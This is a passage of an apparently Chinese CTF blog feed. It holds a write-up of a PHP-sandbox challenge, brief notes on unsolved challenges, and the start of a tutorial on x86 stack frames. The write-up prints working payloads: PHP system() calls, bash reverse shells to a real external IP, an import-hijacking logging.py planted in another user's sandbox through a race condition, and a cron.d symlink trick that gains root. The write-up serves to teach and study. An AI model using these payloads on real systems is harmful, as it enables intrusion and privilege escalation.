punctuation">,</span> session<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> render_template<span class="token keyword">import</span> os<span class="token keyword">import</span> secretsapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secrets<span class="token punctuation">.</span>token_hex<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>working_id <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token builtin">id</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">id</span><span class="token punctuation">.</span>isalnum<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'无效的ID'</span>        session<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">id</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'/sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'mkdir /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string"> &amp;&amp; chown www-data /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string"> &amp;&amp; chmod a+w /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'sandbox'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'submit_id.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/sandbox'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'id'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'submit_code.html'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'id'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'no id'</span>        user_id <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> user_id <span class="token keyword">in</span> working_id<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'task is still running'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            working_id<span class="token punctuation">.</span>append<span class="token punctuation">(</span>user_id<span class="token punctuation">)</span>            code <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span>            os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'cd /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string"> &amp;&amp; rm *'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'sudo -u www-data cp /app/init.py /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string">/init.py &amp;&amp; cd /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string"> &amp;&amp; sudo -u www-data python3 init.py'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'rm -rf /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string">/phpcode'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                        php_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'/sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string">/phpcode'</span></span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>            php_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>code<span class="token punctuation">)</span>            php_file<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            result <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'cd /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string"> &amp;&amp; sudo -u nobody php phpcode'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'cd /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string"> &amp;&amp; rm *'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            working_id<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>user_id<span class="token punctuation">)</span>            <span class="token keyword">return</span> result<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>审计测试发现是一个执行任意php代码的沙盒环境</p><p>直接看到执行php代码的命令这里：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">result <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'cd /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string"> &amp;&amp; sudo -u nobody php phpcode'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以一个低权限执行php文件，这个时候想到能不能对 user_id 命令注入，但是前面有限制：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">id</span><span class="token punctuation">.</span>isalnum<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'无效的ID'</span>session<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">id</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>所以不可能直接改id来注入，当然我们也注意到这里是用 session 存 user_id 的，而 key 是<code>secrets.token_hex(16)</code></p><p>那么接下来的思路是session伪造，想办法获取key，直接用php写py文件导入index.py来获取key</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo "import sys\nsys.path.append(\"/app\")\nimport index\nprint(index.app.secret_key)">2.py &amp;&amp; python3 2.py'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到key：<code>09497afbba5c8dbca6c05b313f712cdf</code>，但是发现这个key每次执行都会变，因为是<code>secrets.token_hex(16)</code></p><p>看来session伪造也行不通，总之先弹个shell</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bash -c \'bash -i >&amp; /dev/tcp/115.236.153.177/30908 &lt;&amp;1\''</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意到文件夹下有个意义不明的init.py</p><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817170906669.png" alt="image-20240817170906669"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> logginglogger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Code execution start'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>看一下哪来的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'sudo -u www-data cp /app/init.py /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string">/init.py &amp;&amp; cd /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string"> &amp;&amp; sudo -u www-data python3 init.py'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从app下cp来的，会以 www-data 的权限运行一次init.py</p><p>那么只要我们能够在用户 AAAAAAAA 这里劫持用户 BBBBBBBB 的 logging 库，写入弹shell的命令，然后通过和 BBBBBBBB 执行php时的<code>rm *</code>竞争就能让上面这个语句执行 www-data 权限的弹shell</p><p>那么先准备两个user，然后在 AAAAAAAA 的shell这里写入 logging.py </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">echo <span class="token operator">-</span>e <span class="token string">"import os,sys;os.system('bash -c \'bash -i >&amp; /dev/tcp/115.236.153.177/12944 &lt;&amp;1\'')"</span><span class="token operator">></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>bbbbbbbb<span class="token operator">/</span>logging<span class="token punctuation">.</span>py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来在 BBBBBBBB 那里重复发包执行<code>python3 init.py</code>进行条件竞争</p><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817231655200.png" alt="image-20240817231655200"></p><p>最终成功弹到 www-data 的shell</p><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817231732722.png" alt="image-20240817231732722"></p><p>接下来要提root权限</p><p>这里使用计划任务<code>/etc/cron.d</code>，<code>ln -s</code>建立 user_id 到计划任务的软链接，这样子phpcode的内容就成计划任务了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> <span class="token parameter variable">-s</span> /etc/cron.d /sandbox/cccccccc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后来到 cccccccc 用户这里，在php的代码框里输入我们设置的计划任务，因为计划任务每分钟更新一次所以我们让php脚本延迟一分钟再被删掉</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">* * * * * root chmod 777 /flag#<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>把 &#x2F;flag 设置为可读，等一分钟过后就可以了</p><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817235426122.png" alt="image-20240817235426122"></p><hr><h1 id="伽玛实验场-tpcms01（Unsolved）"><a href="#伽玛实验场-tpcms01（Unsolved）" class="headerlink" title="伽玛实验场_tpcms01（Unsolved）"></a>伽玛实验场_tpcms01（Unsolved）</h1><p>导入数据库，我用小皮起的数据库环境，需要先注释掉sql文件里第一行的创建数据库</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-u</span> qwadmin <span class="token parameter variable">-p</span> qwadmin <span class="token operator">&lt;</span> db.sql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>数据库里拿到本地管理员的账号<code>admin</code>和md5后的密码<code>21232f297a57a5a743894a0e4a801fc3</code>（爆出来是admin）</p><p>但是远程账密不对</p><p>没时间审tp</p><hr><h1 id="bio-share（Unsolved）"><a href="#bio-share（Unsolved）" class="headerlink" title="bio_share（Unsolved）"></a>bio_share（Unsolved）</h1><blockquote><p>admin’s bio is what u want, but admin will not share it to u.Login as test or test2, with the same password 123456a@b, Admin will visit this  application using <a href="http://www.test.com/">www.test.com</a></p></blockquote><pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">server</span></span> <span class="token punctuation">&#123;</span>    <span class="token directive"><span class="token keyword">listen</span> <span class="token number">80</span></span><span class="token punctuation">;</span>    <span class="token directive"><span class="token keyword">server_name</span> _</span><span class="token punctuation">;</span>    <span class="token directive"><span class="token keyword">location</span> /</span> <span class="token punctuation">&#123;</span>        <span class="token directive"><span class="token keyword">root</span> /app/static</span><span class="token punctuation">;</span>        <span class="token directive"><span class="token keyword">try_files</span> <span class="token variable">$uri</span> <span class="token variable">$uri</span>/ =404</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token directive"><span class="token keyword">location</span> /login/</span> <span class="token punctuation">&#123;</span>        <span class="token directive"><span class="token keyword">proxy_pass</span> http://127.0.0.1:8000</span><span class="token punctuation">;</span>        <span class="token directive"><span class="token keyword">proxy_set_header</span> Host <span class="token variable">$host</span></span><span class="token punctuation">;</span>        <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Real-IP <span class="token variable">$remote_addr</span></span><span class="token punctuation">;</span>        <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Forwarded-For <span class="token variable">$proxy_add_x_forwarded_for</span></span><span class="token punctuation">;</span>        <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Forwarded-Proto <span class="token variable">$scheme</span></span><span class="token punctuation">;</span><span class="token directive"><span class="token keyword">proxy_set_header</span> Origin http://127.0.0.1:8000</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token directive"><span class="token keyword">location</span> ~* ^/static/</span> <span class="token punctuation">&#123;</span>        <span class="token directive"><span class="token keyword">return</span> <span class="token number">302</span> <span class="token variable">$scheme</span>://<span class="token variable">$http_host/forbidden.html?page=</span><span class="token variable">$uri</span></span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token directive"><span class="token keyword">location</span> /api/</span> <span class="token punctuation">&#123;</span>        <span class="token directive"><span class="token keyword">proxy_pass</span> http://127.0.0.1:8000</span><span class="token punctuation">;</span>        <span class="token directive"><span class="token keyword">proxy_set_header</span> Host <span class="token variable">$host</span></span><span class="token punctuation">;</span>        <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Real-IP <span class="token variable">$remote_addr</span></span><span class="token punctuation">;</span>        <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Forwarded-For <span class="token variable">$proxy_add_x_forwarded_for</span></span><span class="token punctuation">;</span>        <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Forwarded-Proto <span class="token variable">$scheme</span></span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用给的账密登录上去，看起来是xss</p><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817155345585.png" alt="image-20240817155345585"></p><hr><h1 id="oldapi（Unsolved）"><a href="#oldapi（Unsolved）" class="headerlink" title="oldapi（Unsolved）"></a>oldapi（Unsolved）</h1><hr><h1 id="easy-java（Unsolved）"><a href="#easy-java（Unsolved）" class="headerlink" title="easy_java（Unsolved）"></a>easy_java（Unsolved）</h1>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;web专场（x&lt;/p&gt;
&lt;p&gt;提权专场（√&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="提权" scheme="http://c1oudfl0w0.github.io/blog/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="内存马" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>C调用过程原理及函数栈帧分析（Intel）</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/08/10/C%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E5%8E%9F%E7%90%86%E5%8F%8A%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7%E5%88%86%E6%9E%90%EF%BC%88Intel%EF%BC%89/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/08/10/C%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E5%8E%9F%E7%90%86%E5%8F%8A%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7%E5%88%86%E6%9E%90%EF%BC%88Intel%EF%BC%89/</id>
    <published>2024-08-10T10:03:51.000Z</published>
    <updated>2024-08-11T04:38:03.262Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>看CVE-2024-2961的时候卡在了需要二进制基础的部分，于是从这里开始正式接触一下二进制安全的内容</p><p>参考原文：</p><p><a href="https://www.yuque.com/cyberangel/rg9gdm/gcz7x2">https://www.yuque.com/cyberangel/rg9gdm/gcz7x2</a></p><span id="more"></span><hr><p>在x86的计算机系统中，内存空间中的栈主要用于<strong>保存函数的参数，返回值，返回地址，本地变量</strong>等</p><p>一切的函数调用都要将不同的数据、地址压入或者弹出栈</p><h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><p>LIFO（后进先出），数据结构已经学了这里就不多写了</p><p>这种形式的数据结构正好满足我们调用函数的方式: <strong>父函数调用子函数，父函数在前，子函数在后；返回时，子函数先返回，父函数后返回</strong></p><p>栈支持两种基本操作：push（入栈）和 pop（出栈，将栈中的数据弹出并存储到指定寄存器或者内存中）</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">push 0x50 ; 将0x50的压入栈<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/10/C%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E5%8E%9F%E7%90%86%E5%8F%8A%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7%E5%88%86%E6%9E%90%EF%BC%88Intel%EF%BC%89/image-20240810183814570.png" alt="image-20240810183814570"></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">pop 寄存器名称 ; 将栈中的0x50弹出到某个寄存器中<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/10/C%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E5%8E%9F%E7%90%86%E5%8F%8A%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7%E5%88%86%E6%9E%90%EF%BC%88Intel%EF%BC%89/image-20240810183835497.png" alt="image-20240810183835497"></p><p>注意：</p><ul><li><p>上面例子中<strong>栈的生长方向是从高地址到低地址</strong>的，对应到图片中栈是向下生长的</p></li><li><p>pop操作后，栈中的数据并没有被清空，只是该数据我们无法直接访问（但是仍然可以访问）</p></li></ul><hr><h1 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h1><p>stack frame，本质上就是一种栈，只是这种栈专门用于<strong>保存函数调用过程中的各种信息（参数，返回地址，本地变量等）</strong></p><p>栈帧有<strong>栈顶</strong>和<strong>栈底</strong>之分，其中栈顶的地址最低，栈底的地址最高，SP（栈指针）就是一直指向栈顶的</p><p>在 x86-32bit 中，我们<strong>用<code>ebp</code>指向栈底、用<code>esp</code>指向栈顶</strong></p><p>栈帧示意图如下：</p><p><img src="/blog/2024/08/10/C%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E5%8E%9F%E7%90%86%E5%8F%8A%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7%E5%88%86%E6%9E%90%EF%BC%88Intel%EF%BC%89/image-20240810183742188.png" alt="image-20240810183742188"></p><p>一般来说，我们将<code>ebp</code>到<code>esp</code>之间区域当做栈帧</p><p>整个栈空间不只有一个栈帧，每调用一个函数，就会生成一个新的栈帧</p><p>在函数调用过程中，我们将调用函数的函数称为“调用者(caller)”，将被调用的函数称为“被调用者(callee)”：</p><ol><li>“调用者”需要知道在哪里获取“被调用者”返回的值</li><li>“被调用者”需要知道传入的参数在哪里</li><li>返回的地址在哪里</li></ol><p>同时，我们需要保证在“被调用者”返回后，**<code>ebp</code>，<code>esp</code> 等寄存器的值应该和调用前一致**。因此，我们需要使用栈来保存这些数据。</p><hr><h1 id="函数调用实例"><a href="#函数调用实例" class="headerlink" title="函数调用实例"></a>函数调用实例</h1><h2 id="函数的调用"><a href="#函数的调用" class="headerlink" title="函数的调用"></a>函数的调用</h2><p>简单写一个demo：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">MyFunction</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">;</span>    a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    b <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    c <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在32位环境的linux下编译</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-o</span> functest ./functest.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后把生成的可执行文件拖进ida反编译，可以看到<code>MyFunction()</code>的汇编代码</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_MyFunction:    push ebp            ; 保存ebp的值    mov  ebp, esp       ; 将esp的值赋给ebp，使新的ebp指向栈顶    sub  esp, 0x12  ; 分配额外空间给本地变量   mov  qword ptr [ebp-4], 10  ;  对栈中的内存进行赋值操作    mov  qword ptr [ebp-8], 5  ;   对栈中的内存进行赋值操作    mov  qword ptr [ebp-12], 2  ;  对栈中的内存进行赋值操作<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时的栈：</p><p><img src="/blog/2024/08/10/C%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E5%8E%9F%E7%90%86%E5%8F%8A%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7%E5%88%86%E6%9E%90%EF%BC%88Intel%EF%BC%89/image-20240810185616949.png" alt="image-20240810185616949"></p><p>一开始两个栈帧都视为是空的，在这个过程中，调用者做了两件事情：</p><ol><li>将被调用函数的参数压入栈中</li><li>将返回地址压入栈中</li></ol><p>这两件事都是调用者负责的，因此<strong>压入的栈应该属于调用者的栈帧</strong></p><p>然后看被调用者：</p><ol><li>将旧的（调用者的） <code>ebp</code>压入栈，此时<code>esp</code>指向它</li><li>将<code>esp</code>的值赋给<code>ebp</code>，<code>ebp</code>就有了新的值，它也指向存放旧<code>ebp</code>的栈空间，这时它成了是函数 MyFunction() 栈帧的栈底</li></ol><p>这样，我们就保存了“调用者”函数的 ebp，并且建立了一个新的栈帧</p><p>接下来，在 ebp 更新后，我们先分配一块0x12字节的空间用于存放本地变量，这步使用<code>sub</code>实现</p><p>通过使用<code>mov</code>转移指令配合字节数<code>ptr [offset]</code>我们便可以给 a, b 和 c 赋值了</p><p><img src="/blog/2024/08/10/C%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E5%8E%9F%E7%90%86%E5%8F%8A%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7%E5%88%86%E6%9E%90%EF%BC%88Intel%EF%BC%89/image-20240810190928975.png" alt="image-20240810190928975"></p><hr><h2 id="函数的返回"><a href="#函数的返回" class="headerlink" title="函数的返回"></a>函数的返回</h2><p>和调用函数时相反，当函数完成自己的任务后，它会将 esp 移到 ebp 处，然后再弹出旧的 ebp 的值到 ebp 寄存器</p><p>这样 ebp 就恢复到了函数调用前的状态了</p><p>demo：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">MyFunction</span><span class="token punctuation">(</span> <span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token 